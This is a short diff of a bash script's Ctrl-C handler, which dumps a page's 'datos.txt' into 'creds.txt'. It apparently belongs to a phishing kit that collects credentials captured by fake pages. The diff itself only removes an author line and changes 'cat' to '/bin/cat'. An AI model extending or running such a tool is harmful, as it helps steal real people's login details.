@@ -1,5 +1,4 @@
 #!/bin/bash
-# Por Hugo Vidal 2024-2025
 export TERM=xterm
 trap ctrl_c INT
 function ctrl_c(){
@@ -9,7 +8,7 @@ function ctrl_c(){
 		./reset.sh
 	fi
 	rm -r content 2>/dev/null
-	echo $(cat ./pages/$pagina/datos.txt) > creds.txt 2> /dev/null
+	echo $(/bin/cat ./pages/$pagina/datos.txt) > creds.txt 2> /dev/null
 	exit 0
 }
 
